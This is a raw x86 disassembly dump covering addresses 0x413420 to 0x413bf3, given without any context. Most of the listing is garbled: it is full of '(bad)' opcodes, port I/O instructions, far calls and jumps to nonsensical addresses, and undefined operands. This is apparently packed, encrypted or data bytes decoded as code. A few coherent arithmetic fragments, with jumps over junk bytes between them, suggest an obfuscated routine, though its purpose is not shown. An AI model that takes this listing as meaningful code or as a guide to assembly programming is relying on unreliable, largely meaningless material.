  413420:	rcl    BYTE PTR [eax+edi*4],0x7
  413424:	mov    WORD PTR [esi+0x5f],fs
  413427:	jmp    0x494a9aa6
  41342c:	push   esp
  41342d:	ins    BYTE PTR es:[edi],dx
  41342e:	mov    al,ds:0x8b68a6a0
  413433:	mov    cl,0xe
  413435:	push   0xdeb867eb
  41343a:	push   ecx
  41343b:	xchg   edi,eax
  41343c:	xchg   bh,bh
  41343e:	add    edi,DWORD PTR [ebp-0x14]
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0x7c65285e
  41345f:	mov    esi,0x787f7843
  413464:	in     eax,0x7e
  413466:	js     0x4134e0
  413468:	cs push cs
  41346a:	outs   dx,DWORD PTR ds:[esi]
  41346b:	xchg   ebx,eax
  41346c:	stc    
  41346d:	ds (bad) 
  41346f:	push   0xffffff9f
  413471:	pop    ecx
  413472:	sub    edx,DWORD PTR [esi-0x348d41b1]
  413478:	je     0x41347d
  41347a:	xchg   ebp,eax
  41347b:	sbb    BYTE PTR [ecx],0x16
  41347e:	fcom   QWORD PTR [edx+ebx*4+0x5f853c80]
  413485:	inc    ebx
  413486:	out    0x27,eax
  413488:	xor    cl,BYTE PTR [ebx]
  41348a:	inc    edi
  41348b:	loop   0x413453
  41348d:	jecxz  0x41342a
  41348f:	push   ss
  413490:	push   ss
  413491:	outs   dx,BYTE PTR ds:[esi]
  413492:	push   ss
  413493:	jnp    0x4134f0
  413495:	(bad)  
  413496:	repz adc al,BYTE PTR [ebx]
  413499:	mov    cl,0xbe
  41349b:	ja     0x4134e8
  41349d:	stos   BYTE PTR es:[edi],al
  41349e:	pop    edi
  4134a0:	fisub  WORD PTR [ebx]
  4134a2:	push   ds
  4134a3:	arpl   WORD PTR [edx+eiz*8],cx
  4134a6:	sahf   
  4134a7:	or     DWORD PTR [ecx],ecx
  4134a9:	push   ecx
  4134aa:	stc    
  4134ab:	dec    esp
  4134ac:	or     al,0xa4
  4134ae:	jmp    0x5072ae6
  4134b3:	lds    ebp,FWORD PTR [esi+0x4d]
  4134b6:	sahf   
  4134b7:	mov    ebp,DWORD PTR ds:0xa98168a8
  4134bd:	test   BYTE PTR [edi],al
  4134bf:	aas    
  4134c0:	(bad)  
  4134c1:	lds    edx,FWORD PTR [ebx-0x1]
  4134c4:	inc    edi
  4134c5:	fcomp  QWORD PTR [edi+0x31c49679]
  4134cb:	jae    0x4134a1
  4134cd:	neg    DWORD PTR [edi-0x39]
  4134d0:	add    DWORD PTR [ebp+0x49],edx
  4134d3:	push   esp
  4134d4:	adc    eax,0xd4b95109
  4134d9:	imul   ebx,edi,0xdd695b48
  4134df:	adc    ecx,DWORD PTR [ebx]
  4134e1:	repz bound ebx,QWORD PTR [ecx+0x2c]
  4134e5:	xor    ebp,DWORD PTR [ecx+0x61]
  4134e8:	cmp    ebp,ecx
  4134ea:	rol    al,1
  4134ec:	pop    edx
  4134ed:	mov    dh,0x6
  4134ef:	mov    al,ds:0xba7f6425
  4134f4:	mov    cl,0xc8
  4134f6:	sbb    DWORD PTR [esi-0x74],0x65
  4134fa:	popf   
  4134fb:	dec    esp
  4134fc:	mov    al,ds:0x6feb1bc0
  413501:	pop    esi
  413502:	in     eax,dx
  413503:	faddp  st(4),st
  413505:	sar    DWORD PTR [edi+0x26b44b8d],1
  41350b:	push   ss
  41350c:	stos   BYTE PTR es:[edi],al
  41350d:	jg     0x413560
  41350f:	in     al,0x83
  413511:	inc    ebx
  413512:	mov    ?,WORD PTR [ebx+0x2a4dac92]
  413518:	xor    al,0xe7
  41351a:	pop    eax
  41351b:	sub    eax,0x64e31e10
  413520:	mov    eax,ebx
  413522:	je     0x41356d
  413524:	sub    BYTE PTR [eax],dh
  413526:	daa    
  413527:	sti    
  413528:	popa   
  413529:	bound  edx,QWORD PTR [edx-0x29]
  41352c:	sbb    eax,0x4a75773c
  413531:	dec    eax
  413532:	loope  0x41355b
  413534:	fstp   DWORD PTR [esi-0x50487b2d]
  41353a:	dec    edi
  41353b:	xor    cl,cl
  41353d:	dec    edx
  41353e:	or     DWORD PTR [esi],ebp
  413540:	mov    ebp,0xf7beace0
  413545:	push   ecx
  413546:	mov    cl,0x90
  413548:	sub    eax,0x370f4929
  41354d:	and    BYTE PTR [edi],al
  41354f:	push   0x0
  413551:	push   edx
  413552:	and    al,0xe
  413554:	push   0x677d50b8
  413559:	nop
  41355a:	dec    esi
  41355b:	dec    esi
  41355c:	lea    eax,[edi+0x2b711d4f]
  413562:	xchg   edx,eax
  413563:	test   eax,0x3b91f08b
  413568:	(bad)  
  413569:	xor    bl,BYTE PTR [ecx-0x5c]
  41356c:	xchg   edi,eax
  41356d:	dec    edi
  41356e:	scas   al,BYTE PTR es:[edi]
  41356f:	sbb    BYTE PTR [ebx+eax*1-0x45],dh
  413573:	add    edi,DWORD PTR [ebx+0x1a]
  413576:	shr    BYTE PTR [eax+0x0],1
  413579:	sub    al,BYTE PTR [edi]
  41357b:	(bad)  
  41357c:	mov    esi,0x4e51525f
  413581:	xchg   ebx,eax
  413582:	jnp    0x41354a
  413584:	in     al,dx
  413585:	pop    eax
  413586:	out    dx,eax
  413587:	hlt    
  413588:	mov    dh,0xee
  41358a:	and    DWORD PTR [ecx-0x24c8b69d],ebx
  413590:	dec    eax
  413591:	rcr    DWORD PTR [ebp+0x2f],1
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	rcl    al,1
  413597:	mov    al,0xd1
  413599:	iret   
  41359a:	rcr    esp,cl
  41359c:	add    BYTE PTR [ecx+0x60],dl
  41359f:	imul   esp,DWORD PTR [edx],0x38
  4135a2:	sub    bl,dh
  4135a4:	push   DWORD PTR [ecx+ebp*8+0x75ea6f81]
  4135ab:	push   esi
  4135ac:	add    esi,ecx
  4135ae:	cmp    DWORD PTR [edx+0x3b20ac47],edx
  4135b4:	pop    edi
  4135b5:	cmp    eax,0xb2b21566
  4135ba:	mov    edx,DWORD PTR [ebx]
  4135bc:	cdq    
  4135bd:	shr    ebx,cl
  4135bf:	mov    dh,0xe2
  4135c1:	mov    cl,0x2
  4135c3:	arpl   WORD PTR ds:0x9b54b4ce,cx
  4135c9:	shl    cl,cl
  4135cb:	adc    edx,esi
  4135cd:	or     al,0xc0
  4135cf:	data16 stc 
  4135d1:	aam    0x98
  4135d3:	jo     0x41355e
  4135d5:	xor    ah,dl
  4135d7:	leave  
  4135d8:	out    0xc9,eax
  4135da:	dec    esp
  4135db:	jle    0x4135f8
  4135dd:	jb     0x413634
  4135df:	sbb    bh,BYTE PTR [ecx-0x5f]
  4135e2:	rcl    BYTE PTR [ebp+0x7d797b91],cl
  4135e8:	pop    esi
  4135e9:	bound  ebx,QWORD PTR [ebp+0x61776750]
  4135ef:	inc    ebp
  4135f0:	lahf   
  4135f1:	xchg   ebp,eax
  4135f2:	bound  edi,QWORD PTR [ecx+edi*8+0x1e]
  4135f6:	inc    edi
  4135f7:	subps  xmm3,xmm2
  4135fa:	mov    ah,0x5
  4135fc:	dec    edx
  4135fd:	(bad)  
  4135fe:	call   ecx
  413600:	fidiv  DWORD PTR [esi+0x39]
  413603:	pop    ecx
  413604:	lds    esi,FWORD PTR [edx]
  413606:	add    edi,DWORD PTR [ecx+0x64]
  413609:	enter  0x835f,0x5
  41360d:	fidiv  DWORD PTR [ebp-0x4f34aba0]
  413613:	aaa    
  413614:	sbb    al,0x1c
  413616:	xlat   BYTE PTR ds:[ebx]
  413617:	mov    ds,WORD PTR [ecx+0x57]
  41361a:	imul   edx,DWORD PTR [esi+0x4],0xe
  41361e:	xchg   ebp,eax
  41361f:	fidiv  DWORD PTR [esi+0x10a0c8b1]
  413625:	sub    bl,bh
  413627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413628:	icebp  
  413629:	or     cl,BYTE PTR [edi]
  41362b:	cmp    ebx,DWORD PTR [eax+0x23]
  41362e:	repnz das 
  413630:	and    esi,0x7ebb08f8
  413636:	repnz pop esp
  413638:	(bad)  
  413639:	dec    esi
  41363a:	sub    ch,BYTE PTR [esi-0x18f4a689]
  413640:	hlt    
  413641:	ins    DWORD PTR es:[edi],dx
  413642:	or     eax,0x2bbd2a3f
  413647:	mov    ds:0x27c2c6f4,al
  41364c:	imul   esi,DWORD PTR [ebx],0xfffffff4
  41364f:	test   DWORD PTR [ebp+0x11c6da21],eax
  413655:	xchg   ebp,eax
  413656:	stc    
  413657:	in     al,dx
  413658:	pop    eax
  413659:	pop    ecx
  41365a:	lock add edx,DWORD PTR [ebp-0x26ed6ee1]
  413661:	jg     0x4136a3
  413663:	ds daa 
  413665:	cmp    al,0xba
  413667:	push   esp
  413668:	mov    ah,0x89
  41366a:	or     ah,al
  41366c:	mov    eax,0x6c2112a7
  413671:	adc    DWORD PTR [esp+eax*8],ecx
  413674:	adc    BYTE PTR [eax+ebp*8-0x285bd44c],dh
  41367b:	cmp    ebx,esp
  41367d:	xor    bh,BYTE PTR [edx]
  41367f:	jmp    0x5415930c
  413684:	aas    
  413685:	jmp    0x60e05737
  41368a:	cmc    
  41368b:	or     eax,0x510aef49
  413690:	mov    bh,0xc8
  413692:	ins    BYTE PTR es:[edi],dx
  413693:	mov    es,WORD PTR [ebp-0x5baf8f06]
  413699:	xchg   edx,eax
  41369a:	dec    edx
  41369b:	sub    ebp,eax
  41369d:	stos   BYTE PTR es:[edi],al
  41369e:	icebp  
  41369f:	xchg   esi,eax
  4136a0:	shl    BYTE PTR [ebp-0xa],1
  4136a3:	in     al,0x34
  4136a5:	pop    ds
  4136a6:	sbb    DWORD PTR [edx-0xe],ebx
  4136a9:	xchg   edi,eax
  4136aa:	jno    0x4136a3
  4136ac:	adc    BYTE PTR [edi],cl
  4136ae:	push   ss
  4136af:	cmovno esi,DWORD PTR [ebx-0x72]
  4136b3:	retf   
  4136b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136b5:	cmp    BYTE PTR ds:0xe7ff0bf9,cl
  4136bb:	cmp    ecx,esp
  4136bd:	sub    al,0x78
  4136bf:	scas   eax,DWORD PTR es:[edi]
  4136c0:	mov    WORD PTR [ebx-0x52149468],?
  4136c6:	test   al,0x78
  4136c8:	cmp    dl,BYTE PTR [ecx+0x39]
  4136cb:	inc    esi
  4136cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136cd:	mov    cl,0x13
  4136cf:	imul   eax,DWORD PTR [edx],0xffffffdf
  4136d2:	jecxz  0x41365f
  4136d4:	push   ebp
  4136d5:	mov    esp,0x33f47d8b
  4136da:	shl    BYTE PTR [ebx],1
  4136dc:	clc    
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp-0x38c28de7]
  4136f4:	pop    eax
  4136f5:	mov    ch,0x28
  4136f7:	jge    0x413778
  4136f9:	js     0x4136e0
  4136fb:	jle    0x413775
  4136fd:	js     0x41375a
  4136ff:	loop   0x4136a2
  413701:	pop    edi
  413702:	jecxz  0x4136a0
  413704:	mov    bh,0x61
  413706:	mov    ebx,0x1d484498
  41370b:	cwde   
  41370c:	sbb    eax,0x63e1fc1d
  413711:	loope  0x4136b6
  413713:	inc    ecx
  413714:	aaa    
  413715:	jne    0x41371e
  413717:	push   0xffffffc4
  413719:	sbb    DWORD PTR [ecx+0x496f0601],edi
  41371f:	mov    al,0xec
  413721:	mov    ebx,0xe3fea38b
  413726:	popa   
  413727:	mov    bl,0x2f
  413729:	lods   al,BYTE PTR ds:[esi]
  41372a:	inc    eax
  41372b:	and    eax,0x62ba5b4
  413730:	mov    ecx,0xfcad679b
  413735:	sub    eax,eax
  413737:	test   al,0x66
  413739:	xor    eax,0x4fbaac96
  41373e:	and    edx,DWORD PTR [eax+0x46]
  413741:	test   al,0x4c
  413743:	pop    edi
  413744:	inc    edi
  413745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413746:	je     0x413702
  413748:	js     0x41374a
  41374a:	dec    ebx
  41374b:	xor    DWORD PTR ss:[ebp+0x4b],eax
  41374f:	icebp  
  413750:	push   es
  413751:	push   edi
  413752:	popa   
  413753:	and    al,0x77
  413755:	dec    esi
  413756:	jge    0x413761
  413758:	mov    al,ds:0x31f805ab
  41375d:	mov    ch,0x2b
  41375f:	das    
  413760:	(bad)  
  413761:	xor    eax,0x40dd8c71
  413766:	call   0xd4be:0x1a17c9b1
  41376d:	mov    ds:0x9980e231,al
  413772:	cmp    DWORD PTR [esp+esi*2+0x4e2fe510],ebx
  413779:	lock scas eax,DWORD PTR es:[edi]
  41377b:	fadd   QWORD PTR [ebx]
  41377e:	xchg   ebp,eax
  41377f:	mov    esi,0xc0f43136
  413784:	leave  
  413785:	xchg   edx,eax
  413786:	and    eax,0x7beea46a
  41378b:	mov    ah,0xee
  41378d:	rcl    eax,cl
  41378f:	adc    al,0x10
  413791:	mov    WORD PTR [edx-0x41],ds
  413794:	jno    0x41372c
  413796:	dec    esi
  413797:	lock cmp eax,0x9b24c90
  41379d:	ret    0x18c0
  4137a0:	shl    BYTE PTR [edi-0x46],cl
  4137a3:	sub    eax,DWORD PTR [edi-0x6a]
  4137a6:	sub    eax,0xc4f724f1
  4137ab:	in     al,0x67
  4137ad:	cld    
  4137ae:	pop    ss
  4137af:	cmp    BYTE PTR [ecx-0x3],dl
  4137b2:	test   al,0x4d
  4137b4:	sub    eax,0xf58467c3
  4137b9:	stc    
  4137ba:	jo     0x4137dc
  4137bc:	outs   dx,DWORD PTR ds:[esi]
  4137bd:	inc    edx
  4137be:	les    ebx,FWORD PTR [edi-0x77]
  4137c1:	cld    
  4137c2:	cmc    
  4137c3:	aad    0xb7
  4137c5:	sub    ecx,DWORD PTR [ebp+0x40ac1c1a]
  4137cb:	dec    edi
  4137cc:	adc    ah,BYTE PTR [eax+esi*2-0x128eec77]
  4137d3:	aad    0xd0
  4137d5:	push   cs
  4137d6:	sub    DWORD PTR [eax],edx
  4137d8:	dec    ebp
  4137d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137da:	ds loopne 0x413837
  4137dd:	mov    eax,0x9c8a4aec
  4137e2:	mov    ecx,0x99dadfd2
  4137e7:	pusha  
  4137e8:	ret    
  4137e9:	(bad)  
  4137ea:	outs   dx,BYTE PTR ds:[esi]
  4137eb:	pop    ds
  4137ec:	xor    DWORD PTR [ebx+0x79],ebx
  4137ef:	into   
  4137f0:	shl    DWORD PTR [ebp-0x4cefefde],0xe
  4137f7:	jb     0x41379d
  4137f9:	adc    al,0xfb
  4137fb:	cmp    eax,0xe06ff9c4
  413800:	mov    cl,0x9a
  413802:	adc    DWORD PTR [esi+ebx*4-0x2d],0x1b
  413807:	jge    0x4137d6
  413809:	mov    cl,dh
  41380b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41380c:	jmp    0x76c3:0xb0a45ef2
  413813:	shl    eax,1
  413815:	aad    0x77
  413817:	jnp    0x4137c1
  413819:	arpl   WORD PTR [esi],bp
  41381b:	xor    al,0x55
  41381d:	shl    BYTE PTR [edx-0x27],cl
  413820:	int3   
  413821:	rcl    DWORD PTR [eax],1
  413823:	or     BYTE PTR [eax+eiz*4-0x48],cl
  413827:	pop    eax
  413828:	jo     0x4137fb
  41382a:	stos   BYTE PTR es:[edi],al
  41382b:	xchg   edx,eax
  41382c:	pusha  
  41382d:	iret   
  41382e:	cmp    al,bl
  413830:	out    dx,eax
  413831:	jbe    0x41385a
  413833:	sbb    DWORD PTR [ecx],esp
  413835:	jo     0x4137f6
  413837:	adc    edi,eax
  413839:	ss add al,0x8f
  41383c:	cmc    
  41383d:	xchg   ebp,eax
  41383e:	dec    ecx
  41383f:	rcr    BYTE PTR [ebx+0x3132c623],1
  413845:	in     al,dx
  413846:	sar    DWORD PTR [ebx-0x6615f54f],0x65
  41384d:	sub    BYTE PTR [esi+0x795e9d33],al
  413853:	inc    ebp
  413854:	or     BYTE PTR [edi],0x8b
  413857:	mov    esp,0xc4308c30
  41385c:	pusha  
  41385d:	push   ds
  41385e:	out    0x20,eax
  413860:	jns    0x41383d
  413862:	dec    esp
  413863:	(bad)  
  413864:	idiv   dh
  413866:	sub    BYTE PTR [ecx],bl
  413868:	lahf   
  413869:	clc    
  41386a:	jo     0x413858
  41386c:	lock mov dh,0x6
  41386f:	je     0x413862
  413871:	jle    0x4138c3
  413873:	dec    eax
  413874:	in     eax,dx
  413875:	sbb    al,0x26
  413877:	or     eax,0xcdb8a11c
  41387c:	cli    
  41387d:	fcom   QWORD PTR [eax]
  41387f:	cmp    eax,0x111c8c0e
  413884:	jbe    0x4138ec
  413886:	(bad)  
  413888:	xchg   BYTE PTR [ebp+0x79],bh
  41388b:	push   ebp
  41388c:	pop    esp
  41388d:	xor    esi,DWORD PTR [ebx-0x1b]
  413890:	ss jge 0x4138c1
  413893:	(bad)  
  413894:	xchg   ebp,eax
  413895:	xchg   DWORD PTR [ebp+0x35],edx
  413898:	lods   al,BYTE PTR ds:[esi]
  413899:	ret    0xf7e4
  41389c:	pushf  
  41389d:	clc    
  41389e:	loope  0x4138b1
  4138a0:	and    eax,ecx
  4138a2:	hlt    
  4138a3:	daa    
  4138a4:	xor    ch,BYTE PTR [ecx-0x2bea8dbf]
  4138aa:	cmp    bl,dl
  4138ac:	(bad)  [ecx]
  4138ae:	xor    al,0x90
  4138b0:	push   cs
  4138b1:	(bad)  [eax-0x6f]
  4138b4:	dec    ebx
  4138b5:	fist   WORD PTR [edi-0x5e]
  4138b8:	shr    DWORD PTR [edx],cl
  4138ba:	(bad)  
  4138bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138bc:	pop    ebx
  4138bd:	fnstsw WORD PTR [eax-0x60223a6d]
  4138c3:	fwait
  4138c4:	ins    BYTE PTR es:[edi],dx
  4138c5:	mov    al,0xb8
  4138c7:	mov    esp,0xd38a7046
  4138cc:	xor    eax,0xb85268a1
  4138d1:	pop    esp
  4138d2:	mov    edi,DWORD PTR [eax+0x1b]
  4138d5:	xchg   edi,eax
  4138d6:	dec    edi
  4138d7:	sbb    eax,0x6552b814
  4138dc:	jmp    0xc6dfdb26
  4138e1:	xor    ch,dh
  4138e3:	sub    DWORD PTR [eax+0x41],esi
  4138e6:	sbb    ebx,DWORD PTR fs:[edx]
  4138e9:	mov    cl,0xdf
  4138eb:	in     al,dx
  4138ec:	inc    edx
  4138ed:	shl    edx,cl
  4138ef:	es pop edi
  4138f1:	inc    edx
  4138f2:	jmp    esp
  4138f4:	scas   al,BYTE PTR es:[edi]
  4138f5:	adc    eax,0x8b30ccaa
  4138fa:	mov    WORD PTR [eax-0x7a],?
  4138fd:	push   edx
  4138fe:	lock jge 0x4138f8
  413901:	mov    ds:0xe9049fb1,al
  413906:	or     bl,BYTE PTR [ebx+0x4c]
  413909:	mov    eax,ds:0xb4673724
  41390e:	add    eax,0x20fa06a6
  413913:	xchg   ebp,eax
  413914:	lods   eax,DWORD PTR ds:[esi]
  413915:	out    0xc1,eax
  413917:	add    DWORD PTR [eax+0xe48f477],eax
  41391d:	lahf   
  41391e:	xor    al,0xa1
  413920:	fidivr DWORD PTR [ebp-0x5c8df048]
  413926:	inc    esi
  413927:	ret    
  413928:	xchg   esi,eax
  413929:	cmp    bl,0xec
  41392c:	pop    edx
  41392d:	pop    esp
  41392e:	in     eax,0x66
  413930:	mov    ebp,edx
  413932:	mov    edx,0x5438f474
  413937:	jno    0x4139a4
  413939:	push   eax
  41393a:	dec    esp
  41393b:	mov    dl,bl
  41393d:	lock jbe 0x413943
  413940:	loope  0x4139b5
  413942:	les    di,DWORD PTR [esi]
  413945:	lea    eax,[edx-0x1b983540]
  41394b:	jns    0x4138cd
  41394d:	mov    eax,ecx
  41394f:	inc    ebp
  413950:	jae    0x4139cb
  413952:	aam    0x80
  413954:	push   cs
  413955:	jmp    0x413999
  413957:	or     al,BYTE PTR [esp+edx*4+0x3]
  41395b:	or     DWORD PTR [eax+0x5c],ebx
  41395e:	push   eax
  41395f:	pop    esp
  413960:	dec    ebx
  413961:	push   es
  413962:	xor    al,0x28
  413964:	sub    BYTE PTR [esi],dh
  413966:	mov    ecx,0xaf0f296f
  41396b:	xlat   BYTE PTR ds:[ebx]
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x413952
  413996:	addr16 aad 0xa9
  413999:	xchg   ebp,eax
  41399a:	add    edi,DWORD PTR [edi+0x78]
  41399d:	in     eax,0x7e
  41399f:	js     0x413a19
  4139a1:	mov    ebp,0xa5a446a0
  4139a6:	push   0x50995cf7
  4139ab:	ins    BYTE PTR es:[edi],dx
  4139ac:	xchg   esi,eax
  4139ad:	in     al,dx
  4139ae:	or     DWORD PTR [edx],0x7a0bcb03
  4139b4:	test   al,0xa4
  4139b6:	xchg   ebp,eax
  4139b7:	test   edi,esp
  4139b9:	movzx  esi,cl
  4139bc:	(bad)  
  4139bd:	xor    eax,0x63bbebf8
  4139c2:	cmp    DWORD PTR [ecx-0x75b083b9],esi
  4139c8:	sub    BYTE PTR [ebp-0x28],0xd8
  4139cc:	xchg   BYTE PTR [ebp+0x15be5b4a],ch
  4139d2:	mov    ds:0xa34130b5,eax
  4139d7:	jge    0x413a20
  4139d9:	and    eax,0x3410648d
  4139de:	mov    ebx,0x51d473de
  4139e3:	add    al,0x24
  4139e5:	outs   dx,BYTE PTR ds:[esi]
  4139e6:	jmp    FWORD PTR [edx]
  4139e8:	push   ds
  4139e9:	mov    eax,ds:0xe50ddad2
  4139ee:	mov    edi,0xd9bb5f68
  4139f3:	mov    ch,0xfc
  4139f5:	es dec ebp
  4139f7:	push   ecx
  4139f8:	out    0x19,al
  4139fa:	repz pop ebp
  4139fc:	mov    edi,0x77bb8a52
  413a01:	push   ecx
  413a02:	push   ds
  413a03:	into   
  413a04:	add    BYTE PTR [ebx-0x239d6f88],0x89
  413a0b:	mov    eax,0xe6c862f3
  413a10:	fdiv   DWORD PTR [ebx+0x2f]
  413a13:	fdivr  DWORD PTR [eax-0x3]
  413a16:	call   0xb0ec7cd0
  413a1b:	cmp    eax,esp
  413a1d:	(bad)  
  413a1e:	mov    ch,0xb6
  413a20:	pop    ebx
  413a21:	add    eax,0x7fef162
  413a26:	dec    edi
  413a27:	add    eax,0xffc4dc5d
  413a2c:	sti    
  413a2d:	adc    eax,0xe3bd55ab
  413a32:	push   ds
  413a33:	add    edx,esi
  413a35:	fadd   QWORD PTR ds:0xdb3fd618
  413a3b:	inc    esi
  413a3c:	aas    
  413a3d:	xor    DWORD PTR [edi],ebx
  413a3f:	push   0x8c83a95e
  413a44:	mov    cl,0x9f
  413a46:	xchg   ebp,eax
  413a47:	push   cs
  413a48:	dec    edx
  413a49:	std    
  413a4a:	mov    ecx,DWORD PTR [ecx+0x54]
  413a4d:	push   ebp
  413a4e:	test   BYTE PTR [esi-0x1f],dl
  413a51:	mov    dl,0x6
  413a53:	rcr    esp,1
  413a55:	fld    TBYTE PTR [ecx-0x8e00b15]
  413a5b:	test   ebx,edi
  413a5d:	jb     0x413a89
  413a5f:	leave  
  413a60:	cwde   
  413a61:	and    esp,DWORD PTR [esi]
  413a63:	mov    cl,0xff
  413a65:	add    al,0xf
  413a67:	es in  al,dx
  413a69:	xchg   BYTE PTR [eax],dh
  413a6b:	jne    0x413a99
  413a6d:	sub    eax,0xc532dcc3
  413a72:	push   ecx
  413a73:	fsub   DWORD PTR [esi-0x29d166d6]
  413a79:	fsubr  st,st(2)
  413a7b:	sti    
  413a7c:	and    dl,bh
  413a7e:	scas   al,BYTE PTR es:[edi]
  413a7f:	stos   DWORD PTR es:[edi],eax
  413a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a81:	cmp    al,0xe4
  413a83:	imul   BYTE PTR [edi+0x63b7cc46]
  413a89:	cwde   
  413a8a:	push   ds
  413a8b:	inc    edi
  413a8c:	popf   
  413a8d:	cs gs or eax,0xb4ea5dca
  413a94:	dec    esi
  413a95:	xchg   ebx,eax
  413a96:	(bad)  
  413a97:	push   DWORD PTR [esi+edx*1-0x18]
  413a9b:	shl    DWORD PTR [edi+0x73be1f95],0x6d
  413aa2:	push   ebp
  413aa3:	popa   
  413aa4:	jb     0x413a5e
  413aa6:	rcl    DWORD PTR [ecx+0x66be903b],0x2e
  413aad:	rcl    eax,0x23
  413ab0:	(bad)  
  413ab1:	xor    DWORD PTR [eax+0xe5ade0f],esp
  413ab7:	or     esp,DWORD PTR [esi+0x6f]
  413aba:	bound  edx,QWORD PTR [eax+0x65]
  413abd:	pop    ebp
  413abe:	sbb    BYTE PTR [eax+0x20],ah
  413ac1:	xchg   ecx,eax
  413ac2:	push   ss
  413ac3:	jbe    0x413b05
  413ac5:	leave  
  413ac6:	add    al,0xd9
  413ac8:	dec    eax
  413ac9:	xchg   ecx,eax
  413aca:	pop    ebp
  413acb:	mov    al,ds:0x2d2c176d
  413ad0:	test   BYTE PTR [edx+0x6d],ch
  413ad3:	sar    DWORD PTR [edx+edi*1+0x6b],cl
  413ad7:	inc    edi
  413ad8:	cmp    ah,bl
  413ada:	inc    BYTE PTR [ebp-0x16]
  413add:	call   0xe7d7:0x5d8cbf91
  413ae4:	pop    esp
  413ae5:	mov    ds:0x236b3b28,al
  413aea:	mov    eax,0xf1876f99
  413aef:	xor    al,0x14
  413af1:	aad    0x9d
  413af3:	sbb    al,0x2c
  413af5:	mov    esi,0x336bec93
  413afa:	gs add al,0xb0
  413afd:	sub    BYTE PTR [ecx+eiz*1+0x5fad5532],dh
  413b04:	mov    ebx,0x66cab41e
  413b09:	mov    cl,0x52
  413b0b:	adc    eax,0x12eade28
  413b10:	xchg   BYTE PTR [edi+0x49],cl
  413b13:	cmp    BYTE PTR [ebx-0x77],cl
  413b16:	imul   edi,DWORD PTR [edi+0x371a20de],0xe858883c
  413b20:	into   
  413b21:	mov    al,ds:0x1ae318fa
  413b26:	pushf  
  413b27:	rcl    DWORD PTR [ecx],cl
  413b29:	je     0x413b81
  413b2b:	mov    BYTE PTR [eax+0x637b29ab],dh
  413b31:	xor    eax,0x22480b4
  413b36:	add    dl,0xb2
  413b39:	test   ecx,esp
  413b3b:	mov    ebp,0x98e30721
  413b40:	jno    0x413b57
  413b42:	mov    bl,0x8c
  413b44:	aad    0x77
  413b46:	add    eax,0xb626aeff
  413b4b:	add    BYTE PTR [edi+0x5c],bl
  413b4e:	leave  
  413b4f:	dec    esp
  413b50:	sbb    ch,BYTE PTR [ebp-0x2f]
  413b53:	(bad)  [eax+eiz*1-0x50]
  413b57:	(bad)  
  413b58:	vdpps  xmm0,xmm4,XMMWORD PTR [edx],0x3d
  413b5e:	jp     0x413b38
  413b60:	mov    ebp,0x48e8b8a
  413b65:	sub    ch,BYTE PTR [ebx+0xd]
  413b68:	sbb    al,0x47
  413b6a:	sbb    dh,BYTE PTR [esi-0x58200050]
  413b70:	or     DWORD PTR [ecx+0x72],ecx
  413b73:	cmp    BYTE PTR [ebx+eax*2-0x22],0xab
  413b78:	ss pop eax
  413b7a:	sbb    DWORD PTR [ebx+0x6765a95d],ebp
  413b80:	mov    ds:0x35999940,al
  413b85:	popf   
  413b86:	adc    edx,eax
  413b88:	or     eax,0xf10705e3
  413b8d:	jmp    0x32d8:0x108acd2c
  413b94:	push   eax
  413b95:	sti    
  413b96:	adc    BYTE PTR [edi],bh
  413b98:	mov    ecx,0xd99fa55d
  413b9d:	sar    DWORD PTR [edx+0x63],0x4
  413ba1:	or     edi,DWORD PTR [ecx+0x4a]
  413ba4:	mov    cl,BYTE PTR [ebp+0x7c]
  413ba7:	fsubr  QWORD PTR [esi-0x80]
  413baa:	fst    DWORD PTR [ecx+0x6cc5c054]
  413bb0:	jl     0x413b64
  413bb2:	in     al,0xd5
  413bb4:	std    
  413bb5:	and    BYTE PTR [edi-0x10],dl
  413bb8:	loopne 0x413b54
  413bba:	je     0x413b46
  413bbc:	mov    cl,BYTE PTR [ebp+0x78]
  413bbf:	fld    QWORD PTR [edx]
  413bc1:	iret   
  413bc2:	loopne 0x413bbf
  413bc4:	jne    0x413b69
  413bc6:	leave  
  413bc7:	pusha  
  413bc8:	fsubr  DWORD PTR [ecx-0x4f]
  413bcb:	clc    
  413bcc:	xchg   esi,eax
  413bcd:	call   0x7991:0x34df250f
  413bd4:	or     bl,dl
  413bd6:	xor    BYTE PTR [edx+0x40],bl
  413bd9:	xor    eax,edi
  413bdb:	inc    esi
  413bdc:	inc    edi
  413bdd:	(bad)  
  413bde:	push   ecx
  413bdf:	xchg   edx,eax
  413be0:	mov    ah,0xa5
  413be2:	cli    
  413be3:	addr16 das 
  413be5:	daa    
  413be6:	popa   
  413be7:	stos   BYTE PTR es:[edi],al
  413be8:	sbb    al,0x42
  413bea:	sub    al,0xfa
  413bec:	or     eax,0xf4b36242
  413bf1:	or     esp,eax
  413bf3:	aam    0xca
